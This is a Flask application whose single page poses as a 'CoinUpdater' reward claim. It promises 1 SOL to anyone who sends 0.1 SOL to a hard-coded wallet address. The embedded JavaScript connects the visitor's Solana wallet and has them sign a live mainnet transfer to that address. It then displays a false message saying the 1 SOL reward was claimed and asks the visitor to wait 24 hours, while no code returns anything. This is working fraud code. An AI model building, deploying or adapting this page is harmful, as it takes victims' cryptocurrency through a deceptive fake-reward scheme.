from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>CoinUpdater - Claim Reward</title>
  <style>
    body {
      background-color: #000000;
      color: #fff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      text-align: center;
      padding: 40px;
      margin: 0;
    }
    h1 {
      font-size: 2.8rem;
      margin-bottom: 0.5rem;
    }
    p.wallet {
      font-size: 1.3rem;
      margin: 1rem 0 3rem;
      letter-spacing: 1.2px;
      word-break: break-all;
    }
    img.qr {
      width: 250px;
      height: 250px;
      border-radius: 20px;
      box-shadow: 0 0 15px #00ff90;
      margin-bottom: 3rem;
    }
    button {
      cursor: pointer;
      border: none;
      border-radius: 40px;
      font-weight: bold;
      font-size: 1.4rem;
      padding: 15px 45px;
      transition: all 0.3s ease;
    }
    #connect-wallet {
      background: linear-gradient(90deg, #00ff90, #00d178);
      color: #000;
      box-shadow: 0 4px 20px #00ff90aa;
      margin-bottom: 20px;
    }
    #connect-wallet:hover {
      background: linear-gradient(90deg, #00d178, #00ff90);
      box-shadow: 0 6px 30px #00ff90ff;
    }
    #claim-button {
      background: #444;
      color: #ccc;
      box-shadow: none;
      pointer-events: none;
      margin-top: 30px;
      opacity: 0.6;
    }
    #claim-button.enabled {
      background: linear-gradient(90deg, #00ff90, #00d178);
      color: #000;
      box-shadow: 0 4px 20px #00ff90aa;
      pointer-events: auto;
      opacity: 1;
    }
    #claim-button:hover.enabled {
      background: linear-gradient(90deg, #00d178, #00ff90);
      box-shadow: 0 6px 30px #00ff90ff;
    }
    footer {
      margin-top: 5rem;
      font-size: 0.9rem;
      color: #444;
    }
    #wallet-address {
      margin-top: 10px;
      font-weight: bold;
      font-size: 1.1rem;
      color: #00ff90;
    }
    #message {
      margin-top: 30px;
      font-size: 1.2rem;
      color: #00ff90;
      min-height: 30px;
    }
  </style>

  <!-- Solana Wallet Adapter and React dependencies -->
  <script src="https://unpkg.com/@solana/wallet-adapter-base@0.9.19/lib/index.iife.js"></script>
  <script src="https://unpkg.com/@solana/wallet-adapter-wallets@0.9.17/lib/index.iife.js"></script>
  <script src="https://unpkg.com/@solana/wallet-adapter-react@0.16.6/lib/index.iife.js"></script>
  <script src="https://unpkg.com/@solana/wallet-adapter-react-ui@0.9.9/lib/index.iife.js"></script>
  <script src="https://unpkg.com/@solana/web3.js@1.73.0/lib/index.iife.js"></script>

  <!-- React + ReactDOM from CDN for the wallet UI -->
  <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
  <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>

</head>
<body>
  <h1>Claim Your 1 SOL Reward!</h1>
  <p class="wallet">Send 0.1 SOL to wallet:<br><strong>{{ wallet }}</strong></p>
  <img src="{{ qr_url }}" alt="QR Code" class="qr" />

  <div id="root"></div>

  <div id="message"></div>

  <footer>
    &copy; 2025 CoinUpdater Bot
  </footer>

  <script type="text/javascript">
    const {
      React,
      ReactDOM,
      solanaWeb3,
      walletAdapterReact,
      walletAdapterWallets,
      walletAdapterReactUi,
    } = window;

    const { useState, useEffect } = React;
    const {
      ConnectionProvider,
      WalletProvider,
      useWallet,
    } = walletAdapterReact;
    const {
      PhantomWalletAdapter,
      SolflareWalletAdapter,
      GlowWalletAdapter,
      SlopeWalletAdapter,
      TorusWalletAdapter,
      LedgerWalletAdapter
    } = walletAdapterWallets;
    const {
      WalletModalProvider,
      WalletMultiButton,
    } = walletAdapterReactUi;

    // Your network and endpoint
    const network = "mainnet-beta";
    const endpoint = solanaWeb3.clusterApiUrl(network);

    function WalletApp() {
      const wallet = useWallet();
      const [message, setMessage] = useState("");

      async function sendTransaction() {
        if (!wallet.connected) {
          setMessage("Please connect your wallet first.");
          return;
        }
        setMessage("Preparing transaction...");
        try {
          const connection = new solanaWeb3.Connection(endpoint, 'confirmed');

          // Construct transaction to send 0.1 SOL
          const transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey: wallet.publicKey,
              toPubkey: new solanaWeb3.PublicKey("{{ wallet }}"),
              lamports: 0.1 * solanaWeb3.LAMPORTS_PER_SOL,
            })
          );

          transaction.feePayer = wallet.publicKey;
          const { blockhash } = await connection.getLatestBlockhash();
          transaction.recentBlockhash = blockhash;

          // Request signature from wallet
          const signed = await wallet.signTransaction(transaction);
          const txid = await connection.sendRawTransaction(signed.serialize());

          setMessage("Transaction sent. Waiting for confirmation...");
          await connection.confirmTransaction(txid, "confirmed");

          setMessage("✅ You’ve claimed 1 SOL! Please wait patiently for 24 hours as requests are high.");
        } catch (err) {
          console.error(err);
          setMessage("❌ Transaction failed or was rejected.");
        }
      }

      return React.createElement(
        "div",
        null,
        React.createElement(WalletMultiButton, { style: { fontSize: "1.3rem", padding: "12px 30px", borderRadius: "40px", marginBottom: "20px" } }),
        wallet.connected && React.createElement("div", { id: "wallet-address" }, `Connected: ${wallet.publicKey.toBase58()}`),
        React.createElement(
          "button",
          {
            id: "claim-button",
            className: wallet.connected ? "enabled" : "",
            onClick: sendTransaction,
          },
          "Claim 1 SOL Reward (Send 0.1 SOL)"
        ),
        React.createElement("div", { id: "message" }, message)
      );
    }

    ReactDOM.createRoot(document.getElementById("root")).render(
      React.createElement(
        ConnectionProvider,
        { endpoint: endpoint },
        React.createElement(
          WalletProvider,
          {
            wallets: [
              new PhantomWalletAdapter(),
              new SolflareWalletAdapter(),
              new GlowWalletAdapter(),
              new SlopeWalletAdapter(),
              new TorusWalletAdapter(),
              new LedgerWalletAdapter(),
            ],
            autoConnect: false,
          },
          React.createElement(WalletModalProvider, null, React.createElement(WalletApp))
        )
      )
    );
  </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(
        HTML_TEMPLATE,
        wallet=WALLET_ADDRESS,
        qr_url=QR_CODE_URL
    )

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
